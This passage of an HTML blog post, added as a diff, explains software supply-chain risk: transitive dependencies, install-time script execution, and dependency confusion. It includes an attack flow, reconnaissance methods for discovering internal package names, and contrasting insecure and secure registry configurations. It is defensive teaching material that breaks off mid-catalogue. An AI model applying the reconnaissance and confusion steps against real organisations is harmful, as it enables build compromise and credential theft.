@@ -1,0 +1,1934 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dependency Management Security in Modern DevOps Pipelines — cvam.sight</title>
+<link rel="stylesheet" href="../style.css?v=20">
+<script>(function(){var t=localStorage.getItem("cvam-theme")||"matcha";if(t&&t!=="paper")document.documentElement.classList.add("theme-"+t);var s=localStorage.getItem("cvam-size");if(s&&s!=="text-md")document.documentElement.classList.add(s);var w=localStorage.getItem("cvam-lw");if(w&&w!=="lw-normal")document.documentElement.classList.add(w);var f=localStorage.getItem("cvam-font");if(f&&f!=="font-sans")document.documentElement.classList.add(f);else{var sf=localStorage.getItem("cvam-sans");if(sf==="0")document.documentElement.classList.add("font-serif");}})()</script>
+<link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
+<script defer src="/_vercel/speed-insights/script.js"></script>
+<script defer src="/_vercel/insights/script.js"></script>
+</head>
+<body>
+  <div class="progress-bar"></div>
+  <div class="layout has-vocab">
+    <aside class="sidebar">
+      <a href="../index.html" class="logo"><span class="dot"></span> cvam.sight</a>
+      <p class="sidebar-sub">blog from a devops + ml apprentice</p>
+      <nav>
+        <a href="../index.html">Home</a>
+        <a href="../series.html">Series</a>
+        <a href="../archive.html">Archive</a>
+        <a href="../tags.html">Tags</a>
+        <a href="../paperjuice.html">Paper Juice</a>
+        <a href="../about.html">About</a>
+      </nav>
+      <div class="sidebar-footer">
+        <p class="sidebar-stat" id="site-readers"></p>
+        <a href="https://www.linkedin.com/in/shivam-kumar2003/" target="_blank">LinkedIn</a>
+        <a href="mailto:shivam.sk2003@gmail.com">Email</a>
+      </div>
+    </aside>
+    <div class="page">
+
+    <article>
+      <div class="post-header">
+        <p class="meta">May 26, 2026 · security · 52 min read · 12400 words</p>
+        <h1>Dependency Management Security in Modern DevOps Pipelines.</h1>
+        <div class="tag-row">
+          <span class="tag fill">security</span>
+          <span class="tag">devops</span>
+          <span class="tag">supply-chain</span>
+          <span class="tag">sbom</span>
+          <span class="tag">ci-cd</span>
+          <span class="tag">devsecops</span>
+        </div>
+      </div>
+
+      <div class="post-body">
+
+        <p>
+          In March 2024, a single backdoor in <strong>XZ Utils</strong> — a compression library so ubiquitous 
+          it ships in essentially every Linux distribution — came within weeks of compromising the entire 
+          internet's SSH infrastructure. The attacker spent two years building trust as a maintainer. 
+          The malicious code passed review. It was caught by accident when a Microsoft engineer noticed 
+          a 500ms latency anomaly during unrelated performance testing.
+        </p>
+        <p>
+          This wasn't novel. It was predictable. The software supply chain has become the dominant attack 
+          vector for sophisticated adversaries because it offers something traditional exploits don't: 
+          <strong>multiplicative reach</strong>. Compromise one package, own thousands of downstream systems. 
+          Poison one build pipeline, infect every artifact it produces.
+        </p>
+        <p>
+          This article is a technical deep-dive into dependency management security — not the 
+          "update your packages" advice that fills most cybersecurity blogs, but the engineering 
+          analysis of <em>why</em> modern dependency systems are structurally vulnerable, <em>how</em> 
+          attackers exploit them, and <em>what</em> enterprise-grade defenses actually look like in 
+          production CI/CD pipelines.
+        </p>
+
+        <blockquote>
+          "The software supply chain is the new perimeter. You can have perfect application security, 
+          perfect network security, perfect identity — and still get owned because you ran 
+          <code>npm install</code>."<br>
+          <span style="color: var(--faint)">— Senior Staff Security Engineer, Fortune 100</span>
+        </blockquote>
+
+        <!-- ============================================================ -->
+        <h2>1. The Trust Problem in Modern Software.</h2>
+        <!-- ============================================================ -->
+
+        <p>
+          Modern applications are not written — they are <strong>assembled</strong>. A typical 
+          enterprise Node.js application has 1,200+ transitive dependencies. A Python ML pipeline 
+          pulls hundreds of packages. A Java microservice might resolve 400+ Maven artifacts 
+          before the first line of business logic compiles.
+        </p>
+        <p>
+          This isn't laziness — it's rational engineering. Reimplementing cryptographic primitives, 
+          HTTP clients, date parsing, or serialization formats is slower, more expensive, and 
+          more bug-prone than using battle-tested libraries. The economic logic is unassailable: 
+          code reuse reduces development time by 40-60% and defect density by 30-50% 
+          (Capers Jones, 2018).
+        </p>
+        <p>
+          The security logic is catastrophic. Every dependency is a <strong>trust decision</strong>. 
+          When you run <code>pip install requests</code>, you're granting arbitrary code execution 
+          to Kenneth Reitz, every maintainer who ever had commit access, everyone who ever 
+          compromised their accounts, and everyone who maintains the 23 transitive dependencies 
+          that <code>requests</code> pulls in.
+        </p>
+
+        <h3>1.1 Transitive Trust Explosion</h3>
+        <p>
+          Direct dependencies are visible. You chose them. You (theoretically) reviewed them. 
+          <strong>Transitive dependencies</strong> are not. They're chosen by your dependencies, 
+          and your dependency's dependencies, recursively — forming trust chains that no human 
+          can fully audit.
+        </p>
+
+        <table>
+          <thead>
+            <tr><th>Package</th><th>Direct Deps</th><th>Transitive Deps</th><th>Trust Expansion Factor</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>react (npm)</td><td>2</td><td>0</td><td>1×</td></tr>
+            <tr><td>express (npm)</td><td>31</td><td>49</td><td>2.6×</td></tr>
+            <tr><td>create-react-app (npm)</td><td>44</td><td>1,458</td><td>34×</td></tr>
+            <tr><td>django (PyPI)</td><td>3</td><td>3</td><td>2×</td></tr>
+            <tr><td>tensorflow (PyPI)</td><td>41</td><td>84</td><td>3×</td></tr>
+            <tr><td>spring-boot-starter-web (Maven)</td><td>5</td><td>92</td><td>19×</td></tr>
+          </tbody>
+        </table>
+        <p class="diagram-label">Tab. 1 — Transitive dependency expansion for common packages (May 2026). Source: deps.dev analysis.</p>
+
+        <p>
+          The security implications are geometric. If each package has a 0.1% chance of being 
+          compromised in any given year, a project with 1,000 transitive dependencies has a 
+          63% chance of including a compromised package annually (1 - 0.999^1000). At 0.5%, 
+          it's 99.3%. The math is brutal and unavoidable.
+        </p>
+
+        <h3>1.2 The Build-Time Attack Surface</h3>
+        <p>
+          Dependencies execute during installation, not just at runtime. Package managers are 
+          designed to run arbitrary code:
+        </p>
+        <ul>
+          <li><strong>npm</strong>: preinstall, install, postinstall scripts in package.json</li>
+          <li><strong>pip</strong>: setup.py is arbitrary Python executed during installation</li>
+          <li><strong>Maven</strong>: plugins execute during build phases with full JVM access</li>
+          <li><strong>Go</strong>: go generate runs arbitrary commands defined in //go:generate comments</li>
+          <li><strong>NuGet</strong>: init.ps1 and install.ps1 PowerShell scripts</li>
+        </ul>
+        <p>
+          This means CI/CD pipelines — which run <code>npm install</code> or <code>pip install -r requirements.txt</code> 
+          on every build — execute attacker-controlled code in privileged environments with access 
+          to secrets, cloud credentials, and artifact signing keys. The build server is the 
+          attacker's code execution environment.
+        </p>
+
+        <div class="diagram-container">
+          <svg viewBox="0 0 720 340" xmlns="http://www.w3.org/2000/svg">
+            <style>
+              .box { fill: #f5f5f0; stroke: #888880; stroke-width: 1.5; }
+              .box-bad { fill: #fff5f5; stroke: #c96442; stroke-width: 2; }
+              .box-good { fill: #f5fff5; stroke: #5a8a5a; stroke-width: 1.5; }
+              .label { fill: #1a1a1a; font-family: 'Kalam', cursive; font-size: 12px; }
+              .label-sm { fill: #555555; font-family: 'Kalam', cursive; font-size: 10px; }
+              .label-bad { fill: #c96442; font-family: 'Kalam', cursive; font-size: 11px; font-weight: bold; }
+              .arrow { stroke: #666660; stroke-width: 1.5; fill: none; marker-end: url(#arrow1); }
+              .arrow-bad { stroke: #c96442; stroke-width: 2; stroke-dasharray: 5,3; fill: none; marker-end: url(#arrow-red); }
+            </style>
+            <defs>
+              <marker id="arrow1" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
+                <polygon points="0 0, 8 3, 0 6" fill="#666660"/>
+              </marker>
+              <marker id="arrow-red" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
+                <polygon points="0 0, 8 3, 0 6" fill="#c96442"/>
+              </marker>
+            </defs>
+            
+            <!-- Developer -->
+            <rect x="20" y="40" width="100" height="50" rx="4" class="box"/>
+            <text x="70" y="70" text-anchor="middle" class="label">Developer</text>
+            
+            <!-- Git Repo -->
+            <rect x="160" y="40" width="100" height="50" rx="4" class="box"/>
+            <text x="210" y="70" text-anchor="middle" class="label">Git Repo</text>
+            
+            <!-- CI Build -->
+            <rect x="300" y="25" width="140" height="80" rx="4" class="box-bad"/>
+            <text x="370" y="50" text-anchor="middle" class="label">CI Build Agent</text>
+            <text x="370" y="68" text-anchor="middle" class="label-sm">npm install</text>
+            <text x="370" y="82" text-anchor="middle" class="label-sm">pip install</text>
+            <text x="370" y="96" text-anchor="middle" class="label-bad">⚠ code exec</text>
+            
+            <!-- Registry -->
+            <rect x="300" y="160" width="140" height="60" rx="4" class="box"/>
+            <text x="370" y="185" text-anchor="middle" class="label">Public Registry</text>
+            <text x="370" y="200" text-anchor="middle" class="label-sm">npm / PyPI / Maven</text>
+            
+            <!-- Attacker Package -->
+            <rect x="300" y="260" width="140" height="50" rx="4" class="box-bad"/>
+            <text x="370" y="282" text-anchor="middle" class="label-bad">Malicious Package</text>
+            <text x="370" y="298" text-anchor="middle" class="label-sm">postinstall: exfil()</text>
+            
+            <!-- Artifact Store -->
+            <rect x="500" y="40" width="100" height="50" rx="4" class="box"/>
+            <text x="550" y="70" text-anchor="middle" class="label">Artifacts</text>
+            
+            <!-- Production -->
+            <rect x="640" y="40" width="70" height="50" rx="4" class="box-good"/>
+            <text x="675" y="70" text-anchor="middle" class="label">Prod</text>
+            
+            <!-- Secrets -->
+            <rect x="480" y="160" width="90" height="50" rx="4" class="box"/>
+            <text x="525" y="182" text-anchor="middle" class="label">Secrets</text>
+            <text x="525" y="198" text-anchor="middle" class="label-sm">AWS_KEY, etc</text>
+            
+            <!-- Arrows -->
+            <path d="M 120 65 L 155 65" class="arrow"/>
+            <path d="M 260 65 L 295 65" class="arrow"/>
+            <path d="M 440 65 L 495 65" class="arrow"/>
+            <path d="M 600 65 L 635 65" class="arrow"/>
+            <path d="M 370 105 L 370 155" class="arrow"/>
+            <path d="M 370 220 L 370 255" class="arrow-bad"/>
+            <path d="M 440 80 L 480 165" class="arrow-bad"/>
+            
+            <!-- Legend -->
+            <text x="580" y="270" class="label-sm">Attack path:</text>
+            <text x="580" y="285" class="label-sm">package → build → secrets</text>
+          </svg>
+          <p class="diagram-label">Fig. 1 — Build-time attack surface. Malicious packages execute during CI/CD dependency resolution, gaining access to build environment secrets.</p>
+        </div>
+
+        <h3>1.3 Ecosystem Scope</h3>
+        <p>
+          The attack surface spans every major package ecosystem:
+        </p>
+        <table>
+          <thead>
+            <tr><th>Ecosystem</th><th>Registry</th><th>Packages (2026)</th><th>Daily Downloads</th><th>Install-Time Execution</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>JavaScript</td><td>npm</td><td>3.2M+</td><td>~45B/week</td><td>Yes (scripts)</td></tr>
+            <tr><td>Python</td><td>PyPI</td><td>550K+</td><td>~1.5B/day</td><td>Yes (setup.py)</td></tr>
+            <tr><td>Java</td><td>Maven Central</td><td>600K+</td><td>~800M/week</td><td>Yes (plugins)</td></tr>
+            <tr><td>Ruby</td><td>RubyGems</td><td>185K+</td><td>~100M/day</td><td>Yes (extensions)</td></tr>
+            <tr><td>.NET</td><td>NuGet</td><td>420K+</td><td>~2.5B/month</td><td>Yes (scripts)</td></tr>
+            <tr><td>Go</td><td>proxy.golang.org</td><td>1.2M+ modules</td><td>~3B/month</td><td>Limited (go:generate)</td></tr>
+            <tr><td>Rust</td><td>crates.io</td><td>150K+</td><td>~2B/month</td><td>Yes (build.rs)</td></tr>
+          </tbody>
+        </table>
+        <p class="diagram-label">Tab. 2 — Major package ecosystems by scale and install-time code execution capability.</p>
+
+        <!-- ============================================================ -->
+        <h2>2. Evolution of Dependency Management.</h2>
+        <!-- ============================================================ -->
+
+        <p>
+          Understanding modern vulnerabilities requires understanding how we got here. Dependency 
+          management evolved through distinct phases, each adding convenience at the cost of 
+          security.
+        </p>
+
+        <h3>2.1 Phase 1: Manual Vendoring (1970s-1990s)</h3>
+        <p>
+          Early software was self-contained. If you needed a library, you obtained the source code, 
+          reviewed it, and compiled it into your project. Dependencies were <strong>vendored</strong> — 
+          copied directly into your codebase and version-controlled alongside your code.
+        </p>
+        <p>
+          This was cumbersome but secure. You knew exactly what code was running because you 
+          committed it yourself. Updates required conscious effort. There was no network trust 
+          boundary to cross at build time.
+        </p>
+
+        <h3>2.2 Phase 2: System Package Managers (1990s-2000s)</h3>
+        <p>
+          Linux distributions introduced system-level package managers: <code>apt</code>, <code>yum</code>, 
+          <code>pacman</code>. These centralized trust in distribution maintainers who curated, patched, 
+          and signed packages. The trust model was clear: you trusted Debian, Red Hat, or Arch to 
+          vet software before it reached your system.
+        </p>
+
+        <h3>2.3 Phase 3: Language-Specific Package Managers (2000s-2010s)</h3>
+        <p>
+          Application developers needed faster iteration than distribution maintainers could provide. 
+          Language-specific ecosystems emerged:
+        </p>
+        <ul>
+          <li><strong>CPAN</strong> (Perl, 1995) — the original model</li>
+          <li><strong>RubyGems</strong> (2004)</li>
+          <li><strong>PyPI</strong> (2003)</li>
+          <li><strong>npm</strong> (2010)</li>
+          <li><strong>Maven Central</strong> (2002)</li>
+          <li><strong>NuGet</strong> (2010)</li>
+        </ul>
+        <p>
+          The trust model inverted. Instead of curated packages vetted by distribution maintainers, 
+          anyone could publish anything. npm famously has no review process — 
+          <code>npm publish</code> makes a package immediately available to the world. PyPI is similar. 
+          Maven Central has some validation (PGP signatures, domain verification) but minimal code review.
+        </p>
+
+        <h3>2.4 Phase 4: Transitive Resolution and Lock Files (2010s)</h3>
+        <p>
+          As ecosystems grew, manual dependency specification became untenable. Package managers 
+          added automatic resolution of transitive dependencies and semantic versioning (semver) 
+          to specify compatibility ranges.
+        </p>
+
+        <pre><code class="lang-json">// package.json — version ranges allow automatic updates
+{
+  "dependencies": {
+    "express": "^4.18.0",     // any 4.x >= 4.18.0
+    "lodash": "~4.17.21",     // any 4.17.x >= 4.17.21
+    "axios": "*"              // literally any version (dangerous)
+  }
+}</code></pre>
+
+        <p>
+          The convenience was enormous. The security implications were severe. Version ranges mean 
+          <code>npm install</code> today might resolve different code than <code>npm install</code> 
+          yesterday — an attacker who publishes <code>lodash@4.17.22</code> immediately gets pulled 
+          into every project with <code>~4.17.21</code>.
+        </p>
+        <p>
+          Lock files (<code>package-lock.json</code>, <code>Pipfile.lock</code>, <code>Gemfile.lock</code>) 
+          emerged to pin exact versions and hashes. But they're optional, frequently regenerated, 
+          and don't protect against initial resolution.
+        </p>
+
+        <h3>2.5 Phase 5: CI/CD Automation (2015s-Present)</h3>
+        <p>
+          Continuous integration normalized automated dependency resolution in privileged environments. 
+          Every push triggers <code>npm install</code> on a build agent with access to deployment 
+          credentials, artifact signing keys, and cloud APIs.
+        </p>
+        <p>
+          This is the current state: <strong>anonymous internet strangers get code execution on 
+          your build infrastructure every time a pipeline runs</strong>.
+        </p>
+
+        <div class="diagram-container">
+          <svg viewBox="0 0 720 200" xmlns="http://www.w3.org/2000/svg">
+            <style>
+              .phase-box { fill: #f5f5f0; stroke: #888880; stroke-width: 1; rx: 3; }
+              .phase-label { fill: #1a1a1a; font-family: 'Kalam', cursive; font-size: 11px; }
+              .phase-sub { fill: #666666; font-family: 'Kalam', cursive; font-size: 9px; }
+              .era-label { fill: #888888; font-family: 'Kalam', cursive; font-size: 10px; }
+              .trust-good { fill: #5a8a5a; }
+              .trust-med { fill: #b8860b; }
+              .trust-bad { fill: #c96442; }
+              .timeline { stroke: #888880; stroke-width: 2; }
+            </style>
+            
+            <!-- Timeline -->
+            <line x1="40" y1="100" x2="680" y2="100" class="timeline"/>
+            
+            <!-- Phase 1 -->
+            <rect x="50" y="40" width="100" height="50" class="phase-box"/>
+            <text x="100" y="62" text-anchor="middle" class="phase-label">Vendoring</text>
+            <text x="100" y="78" text-anchor="middle" class="phase-sub">Manual copy</text>
+            <circle cx="100" cy="100" r="6" class="trust-good"/>
+            <text x="100" y="130" text-anchor="middle" class="era-label">1970s-90s</text>
+            <text x="100" y="145" text-anchor="middle" class="phase-sub">Full control</text>
+            
+            <!-- Phase 2 -->
+            <rect x="180" y="40" width="100" height="50" class="phase-box"/>
+            <text x="230" y="62" text-anchor="middle" class="phase-label">System PMs</text>
+            <text x="230" y="78" text-anchor="middle" class="phase-sub">apt, yum</text>
+            <circle cx="230" cy="100" r="6" class="trust-good"/>
+            <text x="230" y="130" text-anchor="middle" class="era-label">1990s-00s</text>
+            <text x="230" y="145" text-anchor="middle" class="phase-sub">Curated trust</text>
+            
+            <!-- Phase 3 -->
+            <rect x="310" y="40" width="100" height="50" class="phase-box"/>
+            <text x="360" y="62" text-anchor="middle" class="phase-label">Lang PMs</text>
+            <text x="360" y="78" text-anchor="middle" class="phase-sub">npm, pip, gem</text>
+            <circle cx="360" cy="100" r="6" class="trust-med"/>
+            <text x="360" y="130" text-anchor="middle" class="era-label">2000s-10s</text>
+            <text x="360" y="145" text-anchor="middle" class="phase-sub">Open publish</text>
+            
+            <!-- Phase 4 -->
+            <rect x="440" y="40" width="100" height="50" class="phase-box"/>
+            <text x="490" y="62" text-anchor="middle" class="phase-label">Auto-resolve</text>
+            <text x="490" y="78" text-anchor="middle" class="phase-sub">semver, locks</text>
+            <circle cx="490" cy="100" r="6" class="trust-med"/>
+            <text x="490" y="130" text-anchor="middle" class="era-label">2010s</text>
+            <text x="490" y="145" text-anchor="middle" class="phase-sub">Transitive deps</text>
+            
+            <!-- Phase 5 -->
+            <rect x="570" y="40" width="100" height="50" class="phase-box"/>
+            <text x="620" y="62" text-anchor="middle" class="phase-label">CI/CD Auto</text>
+            <text x="620" y="78" text-anchor="middle" class="phase-sub">Build agents</text>
+            <circle cx="620" cy="100" r="6" class="trust-bad"/>
+            <text x="620" y="130" text-anchor="middle" class="era-label">2015s+</text>
+            <text x="620" y="145" text-anchor="middle" class="phase-sub">Build-time exec</text>
+            
+            <!-- Legend -->
+            <circle cx="50" cy="180" r="5" class="trust-good"/>
+            <text x="60" y="183" class="phase-sub">High trust</text>
+            <circle cx="130" cy="180" r="5" class="trust-med"/>
+            <text x="140" y="183" class="phase-sub">Medium trust</text>
+            <circle cx="220" cy="180" r="5" class="trust-bad"/>
+            <text x="230" y="183" class="phase-sub">Low trust</text>
+          </svg>
+          <p class="diagram-label">Fig. 2 — Evolution of dependency management. Trust guarantees eroded as convenience increased.</p>
+        </div>
+
+        <h3>2.6 Dependency Resolution Deep Dive</h3>
+        <p>
+          Understanding attack vectors requires understanding how package managers resolve dependencies. 
+          The process is more complex than most developers realize:
+        </p>
+
+        <pre><code class="lang-bash"># npm resolution order
+1. Check package-lock.json for pinned version + integrity hash
+2. If not locked, parse package.json version range
+3. Query registry for available versions matching range
+4. Select highest matching version (newest wins)
+5. Recursively resolve transitive dependencies
+6. Download tarballs from registry
+7. Verify integrity hashes (if present in lock)
+8. Extract to node_modules/
+9. Execute lifecycle scripts (preinstall, install, postinstall)</code></pre>
+
+        <pre><code class="lang-bash"># pip resolution (more complex)
+1. Parse requirements.txt or pyproject.toml
+2. Query PyPI for package metadata
+3. Build dependency graph with backtracking
+4. If --extra-index-url specified, query BOTH registries
+5. For each registry, select highest matching version
+6. Download wheel or sdist (source distribution)
+7. If sdist, execute setup.py to build wheel
+8. Install into site-packages</code></pre>
+
+        <p>
+          The security-critical detail: <strong>resolution happens at install time, not commit time</strong>. 
+          Unless you have a complete lock file with integrity hashes, what you install today may differ 
+          from what was installed yesterday.
+        </p>
+
+        <!-- ============================================================ -->
+        <h2>3. Dependency Confusion Attacks.</h2>
+        <!-- ============================================================ -->
+
+        <p>
+          In February 2021, security researcher Alex Birsan published research demonstrating how he 
+          gained code execution at Apple, Microsoft, PayPal, Shopify, Netflix, Tesla, Uber, and 
+          dozens of other companies — earning over $130,000 in bug bounties. The technique: 
+          <strong>dependency confusion</strong>.
+        </p>
+
+        <h3>3.1 The Attack Vector</h3>
+        <p>
+          Large organizations maintain internal package registries (Artifactory, Nexus, Azure Artifacts, 
+          CodeArtifact) for proprietary libraries. These internal packages often have names like 
+          <code>@company/auth-utils</code> or <code>company-internal-logger</code>.
+        </p>
+        <p>
+          The vulnerability arises when build systems are configured to check <strong>both</strong> 
+          internal and public registries. If an attacker can determine the names of internal packages 
+          and publish higher-versioned packages with identical names on public registries, the package 
+          manager may prefer the public (malicious) version.
+        </p>
+
+        <h3>3.2 Attack Walkthrough</h3>
+
+        <div class="diagram-container">
+          <svg viewBox="0 0 720 380" xmlns="http://www.w3.org/2000/svg">
+            <style>
+              .step-box { fill: #f5f5f0; stroke: #888880; stroke-width: 1.5; }
+              .step-bad { fill: #fff5f5; stroke: #c96442; stroke-width: 2; }
+              .step-num { fill: #888880; font-family: 'Kalam', cursive; font-size: 14px; font-weight: bold; }
+              .step-label { fill: #1a1a1a; font-family: 'Kalam', cursive; font-size: 11px; }
+              .step-detail { fill: #555555; font-family: 'Kalam', cursive; font-size: 9px; }
+              .arrow-flow { stroke: #666660; stroke-width: 1.5; fill: none; marker-end: url(#arrow-flow); }
+              .arrow-attack { stroke: #c96442; stroke-width: 2; fill: none; marker-end: url(#arrow-attack); stroke-dasharray: 5,3; }
+            </style>
+            <defs>
+              <marker id="arrow-flow" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
+                <polygon points="0 0, 8 3, 0 6" fill="#666660"/>
+              </marker>
+              <marker id="arrow-attack" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
+                <polygon points="0 0, 8 3, 0 6" fill="#c96442"/>
+              </marker>
+            </defs>
+            
+            <!-- Step 1: Recon -->
+            <circle cx="60" cy="50" r="20" class="step-box"/>
+            <text x="60" y="55" text-anchor="middle" class="step-num">1</text>
+            <text x="60" y="90" text-anchor="middle" class="step-label">Recon</text>
+            <text x="60" y="105" text-anchor="middle" class="step-detail">Find internal</text>
+            <text x="60" y="118" text-anchor="middle" class="step-detail">package names</text>
+            
+            <!-- Step 2: Create Package -->
+            <circle cx="180" cy="50" r="20" class="step-bad"/>
+            <text x="180" y="55" text-anchor="middle" class="step-num">2</text>
+            <text x="180" y="90" text-anchor="middle" class="step-label">Create</text>
+            <text x="180" y="105" text-anchor="middle" class="step-detail">Publish malicious</text>
+            <text x="180" y="118" text-anchor="middle" class="step-detail">v99.0.0 on npm</text>
+            
+            <!-- Step 3: Wait -->
+            <circle cx="300" cy="50" r="20" class="step-box"/>
+            <text x="300" y="55" text-anchor="middle" class="step-num">3</text>
+            <text x="300" y="90" text-anchor="middle" class="step-label">Wait</text>
+            <text x="300" y="105" text-anchor="middle" class="step-detail">CI pipeline</text>
+            <text x="300" y="118" text-anchor="middle" class="step-detail">runs npm install</text>
+            
+            <!-- Step 4: Confusion -->
+            <circle cx="420" cy="50" r="20" class="step-bad"/>
+            <text x="420" y="55" text-anchor="middle" class="step-num">4</text>
+            <text x="420" y="90" text-anchor="middle" class="step-label">Confusion</text>
+            <text x="420" y="105" text-anchor="middle" class="step-detail">npm prefers</text>
+            <text x="420" y="118" text-anchor="middle" class="step-detail">higher version</text>
+            
+            <!-- Step 5: Execution -->
+            <circle cx="540" cy="50" r="20" class="step-bad"/>
+            <text x="540" y="55" text-anchor="middle" class="step-num">5</text>
+            <text x="540" y="90" text-anchor="middle" class="step-label">Execution</text>
+            <text x="540" y="105" text-anchor="middle" class="step-detail">postinstall</text>
+            <text x="540" y="118" text-anchor="middle" class="step-detail">exfil secrets</text>
+            
+            <!-- Step 6: Profit -->
+            <circle cx="660" cy="50" r="20" class="step-bad"/>
+            <text x="660" y="55" text-anchor="middle" class="step-num">6</text>
+            <text x="660" y="90" text-anchor="middle" class="step-label">Owned</text>
+            <text x="660" y="105" text-anchor="middle" class="step-detail">Cloud creds</text>
+            <text x="660" y="118" text-anchor="middle" class="step-detail">exfiltrated</text>
+            
+            <!-- Arrows -->
+            <path d="M 80 50 L 155 50" class="arrow-flow"/>
+            <path d="M 200 50 L 275 50" class="arrow-attack"/>
+            <path d="M 320 50 L 395 50" class="arrow-flow"/>
+            <path d="M 440 50 L 515 50" class="arrow-attack"/>
+            <path d="M 560 50 L 635 50" class="arrow-attack"/>
+            
+            <!-- Registry Diagram -->
+            <rect x="40" y="160" width="280" height="200" rx="4" class="step-box"/>
+            <text x="180" y="185" text-anchor="middle" class="step-label">Internal Registry (Artifactory)</text>
+            <rect x="60" y="200" width="240" height="40" rx="2" class="step-box"/>
+            <text x="180" y="225" text-anchor="middle" class="step-detail">@acme/auth-utils@1.2.3</text>
+            
+            <rect x="400" y="160" width="280" height="200" rx="4" class="step-bad"/>
+            <text x="540" y="185" text-anchor="middle" class="step-label">Public Registry (npm)</text>
+            <rect x="420" y="200" width="240" height="40" rx="2" class="step-bad"/>
+            <text x="540" y="225" text-anchor="middle" class="step-detail">@acme/auth-utils@99.0.0 ← ATTACKER</text>
+            
+            <!-- npm resolution -->
+            <rect x="200" y="280" width="320" height="60" rx="4" class="step-box"/>
+            <text x="360" y="300" text-anchor="middle" class="step-label">npm resolution: max(1.2.3, 99.0.0) = 99.0.0</text>
+            <text x="360" y="320" text-anchor="middle" class="step-detail">→ Pulls malicious public package</text>
+            
+            <path d="M 180 240 L 180 275 L 200 280" class="arrow-flow"/>
+            <path d="M 540 240 L 540 260 L 520 275" class="arrow-attack"/>
+          </svg>
+          <p class="diagram-label">Fig. 3 — Dependency confusion attack flow. Higher version on public registry wins resolution.</p>
+        </div>
+
+        <h3>3.3 Reconnaissance Techniques</h3>
+        <p>
+          Attackers discover internal package names through multiple vectors:
+        </p>
+        <ul>
+          <li><strong>GitHub/GitLab leaks</strong>: package.json, requirements.txt, pom.xml files in public repos</li>
+          <li><strong>JavaScript source maps</strong>: Production apps often include mappings that reveal internal import paths</li>
+          <li><strong>Error messages</strong>: Stack traces exposing internal module paths</li>
+          <li><strong>npm registry patterns</strong>: Scoped packages (@company/*) that return 404 suggest internal names</li>
+          <li><strong>Job postings</strong>: "Experience with our internal framework X" reveals package names</li>
+          <li><strong>Open source contributions</strong>: Company engineers referencing internal tools</li>
+        </ul>
+
+        <h3>3.4 Dangerous Configurations</h3>
+        <p>
+          The vulnerability manifests in specific misconfigurations:
+        </p>
+
+        <pre><code class="lang-bash"># DANGEROUS: pip with --extra-index-url
+# Checks BOTH registries, prefers highest version from either
+pip install --extra-index-url https://internal.company.com/pypi mypackage
+
+# DANGEROUS: npm with multiple registries in .npmrc
+registry=https://registry.npmjs.org/
+@company:registry=https://internal.company.com/npm/
+
+# DANGEROUS: Maven with multiple repositories (resolution order matters)
+&lt;repositories&gt;
+  &lt;repository&gt;
+    &lt;id&gt;central&lt;/id&gt;
+    &lt;url&gt;https://repo1.maven.org/maven2&lt;/url&gt;
+  &lt;/repository&gt;
+  &lt;repository&gt;
+    &lt;id&gt;internal&lt;/id&gt;
+    &lt;url&gt;https://nexus.company.com/repository/maven-releases&lt;/url&gt;
+  &lt;/repository&gt;
+&lt;/repositories&gt;</code></pre>
+
+        <h3>3.5 Secure Configurations</h3>
+
+        <pre><code class="lang-bash"># SECURE: pip with --index-url (replaces default, doesn't add)
+pip install --index-url https://internal.company.com/pypi mypackage
+
+# SECURE: npm with scoped registry isolation
+@company:registry=https://internal.company.com/npm/
+# Public packages go to public registry, @company/* only to internal
+
+# SECURE: Maven with proxy repository (internal proxies public)
+&lt;repositories&gt;
+  &lt;repository&gt;
+    &lt;id&gt;internal-proxy&lt;/id&gt;
+    &lt;url&gt;https://nexus.company.com/repository/maven-proxy&lt;/url&gt;
+  &lt;/repository&gt;
+&lt;/repositories&gt;
+# Nexus configured to proxy Maven Central with allowlist</code></pre>
+
+        <pre><code class="lang-bash"># SECURE: Azure Artifacts with upstream sources disabled for internal feed
+# Configure feed to NOT proxy npmjs.org for internal packages
+
+# SECURE: JFrog Artifactory with inclusion/exclusion patterns
+# Virtual repository excludes com.company.** from remote repos</code></pre>
+
+        <h3>3.6 Platform-Specific Defenses</h3>
+
+        <table>
+          <thead>
+            <tr><th>Ecosystem</th><th>Vulnerability</th><th>Mitigation</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>npm</td><td>Scoped packages can be claimed on public registry</td><td>Claim @company scope on npmjs.org (even if unused publicly)</td></tr>
+            <tr><td>pip</td><td>--extra-index-url merges registries</td><td>Use --index-url only; configure pip.conf with single index</td></tr>
+            <tr><td>Maven</td><td>Multi-repo resolution non-deterministic</td><td>Single virtual repo with exclusion patterns</td></tr>
+            <tr><td>NuGet</td><td>Multiple sources queried in parallel</td><td>Package source mapping in NuGet.config</td></tr>
+            <tr><td>Go</td><td>GOPROXY falls through to public</td><td>GOPRIVATE env var; GONOSUMDB for internal modules</td></tr>
+          </tbody>
+        </table>
+        <p class="diagram-label">Tab. 3 — Ecosystem-specific dependency confusion mitigations.</p>
+
+        <!-- ============================================================ -->
+        <h2>4. Major Dependency Attack Categories.</h2>
+        <!-- ============================================================ -->
+
+        <p>
+          Dependency confusion is one vector among many. The taxonomy of supply chain attacks is 
+          broad and evolving. This section catalogs the major categories with real-world examples.
+        </p>
+
+        <h3>4.1 Typosquatting</h3>
+        <p>
+          Attackers register packages with names similar to popular libraries, hoping developers 
+          mistype during installation:
+        </p>
+        <ul>
+          <li><code>colourama</code> instead of <code>colorama</code></li>
+          <li><code>python-nmap</code> vs <code>nmap</code></li>
+          <li><code>crossenv</code> mimicking <code>cross-env</code></li>
+          <li><code>lodahs</code> instead of <code>lodash</code></li>
+        </ul>
+        <p>
+          <strong>Example (2017)</strong>: The <code>crossenv</code> package on npm harvested environment 
+          variables (including npm tokens) from every system that installed it. It existed for two weeks 
+          before detection, accumulating thousands of downloads.
+        </p>
+        <p>
+          <strong>Blast radius</strong>: Typically small — affects careless developers or CI scripts with typos. 
+          Mitigated by code review and lockfiles.
+        </p>
+
+        <h3>4.2 Malicious Maintainer Attacks</h3>
+        <p>
